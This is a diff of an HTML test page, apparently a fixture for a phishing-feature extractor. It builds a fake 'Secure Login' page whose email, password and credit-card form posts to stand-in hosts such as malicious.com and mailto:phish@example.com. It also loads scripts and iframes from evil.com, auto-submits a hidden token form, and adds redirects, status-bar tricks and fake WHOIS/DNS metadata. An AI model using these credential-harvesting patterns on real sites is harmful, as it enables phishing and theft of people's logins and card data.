@@ -1,151 +1,99 @@
-<!-- CHATGPT GENERATED TEST HTML TO TRIGGER PHISHING FEATURE EXTRACTION_09202025 --> 
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Phishing Feature Capture — Test Page</title>
+  <meta charset="UTF-8">
+  <title>http://192.168.0.1@secure-login.example-security-test.bit.ly.co.uk/login?user=test%40email&pass=123</title>
+  
+  <!-- External favicon -->
+  <link rel="icon" href="http://evil.com/favicon.ico">
 
-  <!-- 1) External favicon (different host) -->
-  <link rel="icon" href="https://assets.external-test-domain.org/favicon.ico" type="image/x-icon" />
+  <!-- Meta tags for website forwarding -->
+  <meta http-equiv="refresh" content="0;url=http://redirect.example.com">
+  <meta name="keywords" content="phishing, login, test">
+  <meta name="description" content="Fake login page for feature extractor testing.">
 
-  <!-- 2) Meta refresh (suspicious) -->
-  <meta http-equiv="refresh" content="30;url=https://example.com/warn" />
-
-  <!-- 3) Some meta tags -->
-  <meta name="robots" content="noindex,nofollow" />
-  <meta name="referrer" content="unsafe-url" />
-
-  <style>
-    /* some CSS to include styles (counts as CSS content) */
-    body { font-family: Arial, sans-serif; margin:24px; background:#fff; color:#222; }
-    .card { box-shadow: 0 2px 8px rgba(0,0,0,0.08); padding:18px; margin-bottom:16px; border-radius:8px; }
-    /* intentionally hide selection (status bar / UI trick) */
-    ::selection { background: #000; color: #fff; }
-  </style>
-
-  <!-- External script (third-party domain) -->
-  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-
-  <!-- Inline script (window.status, open popup, disable right-click, contextmenu) -->
   <script>
-    // status bar customization
-    try { window.status = "Secure Connection"; } catch(e) {}
-    // override history to mask URL sometimes (replaceState)
-    try { history.replaceState({}, '', '/masked/path'); } catch(e) {}
+    // Status bar manipulation
+    window.status = "Loading secure login...";
 
-    // disable right click
-    document.addEventListener('contextmenu', function(e){ e.preventDefault(); }, false);
+    // Disable right click
+    document.addEventListener("contextmenu", e => e.preventDefault());
 
-    // open a popup after load
-    function openPopup() {
-      try {
-        window.open('https://popup.external-test-domain.org/warning','popupwin','width=400,height=300');
-      } catch(e) {}
-    }
+    // Popup
+    function showPopup() { window.open("http://evil.com/ad.html"); }
 
-    // simulate inline script that counts as inline JS
-    document.addEventListener('DOMContentLoaded', function(){
-      setTimeout(openPopup, 1000);
-    });
+    // Website forwarding via JS
+    setTimeout(() => { window.location = "http://forward.example.com"; }, 5000);
   </script>
 </head>
 <body>
-  <h1 class="card">Phishing Feature Capture — Test Page</h1>
+  <h1>Secure Login</h1>
 
-  <!-- 4) Many third-party resources (images, fonts, scripts) -->
-  <img src="https://logos.cdn-test.net/paypal-logo.png" alt="paypal logo" id="brand-logo" style="max-width:200px" />
-  <img src="/local-logo.png" alt="logo-local" style="max-width:120px" />
+  <!-- Logo -->
+  <img src="http://cdn.otherdomain.com/images/logo.png" alt="Logo">
 
-  <p class="card">
-    This page intentionally contains a combination of elements designed to trigger feature extraction:
-    <ul>
-      <li>Forms requesting sensitive fields (password, credit card).</li>
-      <li>iframe embedding remote content.</li>
-      <li>mailto links and form actions to mailto:</li>
-      <li>scripts inline and external, popups and status bar tricks.</li>
-    </ul>
-  </p>
-
-  <!-- 5) Form with sensitive inputs (password + credit card) -->
-  <form id="loginForm" action="mailto:phish@example.com" method="post">
-    <label>Email: <input type="email" name="email" required /></label><br><br>
-    <label>Password: <input type="password" name="password" /></label><br><br>
-
-    <!-- credit card inputs to trigger 'sensitive_forms' detection -->
-    <label>Card Number: <input type="text" name="cardnumber" placeholder="4111 1111 1111 1111" /></label><br><br>
-    <label>CVV: <input type="text" name="cvv" maxlength="4" /></label><br><br>
-
-    <input type="submit" value="Continue" />
+  <!-- Sensitive form -->
+  <form action="http://malicious.com:8080/submit.php" method="post">
+    <label>Email: <input type="text" name="email"></label><br>
+    <label>Password: <input type="password" name="password"></label><br>
+    <label>Credit Card: <input type="text" name="cardnumber"></label><br>
+    <input type="submit" value="Login">
   </form>
 
-  <!-- 6) Another form that submits to an external script (third-party domain) -->
-  <form id="exfil" action="https://api.external-data-sink.org/collect" method="post">
-    <input type="hidden" name="token" value="abcdef123456" />
-  </form>
+  <!-- Mailto link -->
+  <a href="mailto:support@phishy.com">Contact Support</a>
 
-  <!-- 7) iframe embedding external content -->
-  <iframe src="https://widgets.external-test-domain.org/preview" width="600" height="200"></iframe>
+  <!-- External + inline scripts -->
+  <script src="http://evil.com/script.js"></script>
+  <script>console.log("Inline script");</script>
 
-  <!-- 8) Link with '@' in path to ensure presence of '@' token in URL string,
-       and also some suspicious characters in query params -->
-  <a id="weblink" href="http://203.0.113.5:8080/login-https-example.your-test-domain.tld/https@redirect?next=https%3A%2F%2Fsecure&ref=%25&utm=1">Suspicious link</a>
+  <!-- Iframe present -->
+  <iframe src="http://evil.com/tracker.html"></iframe>
 
-  <!-- 9) Inline JS that references window.open, window.status again -->
-  <script>
-    // additional JS patterns: onbeforeunload, addEventListener contextmenu already added earlier
-    window.onbeforeunload = function() { return "Are you sure?"; };
-    // dynamic script injection (creates external script tag)
-    (function(){
-      var s = document.createElement('script');
-      s.src = "https://cdn.external-assets.org/tracker.js";
-      document.head.appendChild(s);
-    })();
-  </script>
+  <!-- Suspicious links -->
+  <a href="http://example.com//redirect//page">Double slash redirect</a>
+  <a href="http://sub1.sub2.sub3.sub4.example.com/login">Many subdomains</a>
+  <a href="http://example.com:8080/nonstandardport">Non-standard port</a>
+  <a href="https://example.com/login?param1=val1&param2=val2%20data">URL with % & ?</a>
 
-  <!-- 10) small inline CSS and a non-standard port link to simulate non-443 usage in resources -->
-  <link rel="stylesheet" href="http://assets.external-test-domain.org:8081/styles.css" />
+  <!-- History manipulation -->
+  <script>history.replaceState({}, '', '/fakepath');</script>
 
-  <!-- 11) hidden iframe and many <script> tags to increase counts -->
-  <iframe src="about:blank" style="display:none"></iframe>
-  <script src="https://analytics.somecdn.net/ga.js"></script>
-  <script>console.log("inline script 1");</script>
-  <script>console.log("inline script 2");</script>
-  <script src="/local-script.js"></script>
+  <!-- =========================
+       Fake metadata blocks
+       for server-only features
+       ========================= -->
 
-  <!-- 12) element to capture "status bar customization" and "popups" -->
-  <button onclick="window.open('https://openme.example.org','mywin','width=300,height=300')">Open Popup</button>
+  <!-- SSL_CERT:
+       issuer=FakeCA Ltd
+       valid_from=2020-01-01
+       valid_to=2030-01-01
+       valid=true -->
 
-  <!-- 13) an embedded image filename with 'logo' to help known logo detection -->
-  <img src="https://cdn.external-test-domain.org/images/official-logo-1.png" alt="Official Logo" />
+  <!-- WHOIS:
+       domain=example-security-test.bit.ly.co.uk
+       registrar=FakeRegistrar
+       creation_date=2020-01-01
+       expiration_date=2035-01-01
+       suspicious_tokens=privacy,whoisguard -->
 
-  <!-- 14) a long URL example shown on the page to help URL-length tests -->
-  <p>Example long URL: <code>http://203.0.113.5:8080/path/very/long/name/with/many/segments/and/query?this=is&a=lot&of=params&and=%25chars</code></p>
+  <!-- DNS:
+       A_records=192.168.0.1,192.168.0.2
+       NS_records=ns1.fake.com,ns2.fake.com
+       MX_records=mail.fake.com
+       record_count=5 -->
 
-  <!-- 15) a "mailto:" link explicitly present -->
-  <a href="mailto:test-alert@example.com">Contact</a>
+  <!-- TRAFFIC:
+       tranco_rank=123456
+       page_rank=5
+       backlinks=42 -->
 
-  <!-- 16) intentionally add hidden inputs and suspicious fields -->
-  <form style="display:none" id="hidden">
-    <input type="text" name="ssn" value="123-45-6789" />
-  </form>
+  <!-- INDEX:
+       google_indexed=true -->
 
-  <script>
-    // small automated actions to increase evidence (do not run in production)
-    // fill secondary form and auto-submit to emulate redirect chain
-    try {
-      // trigger iframe load content (if allowed)
-      document.getElementById('exfil').submit();
-    } catch(e) {}
-
-    // create lots of query-like characters in the page to be counted
-    var fuzz = "????%%%&&&====++++";
-    var el = document.createElement('div');
-    el.textContent = fuzz;
-    document.body.appendChild(el);
-  </script>
-
-  <!-- 17) include a link to a punycode domain for 'xn--' detection (literal shown) -->
-  <p>Punycode example: <code>http://xn--e1awd7f.com/</code></p>
+  <!-- BLACKLIST:
+       virustotal=false
+       google_safe_browsing=false -->
 
 </body>
 </html>
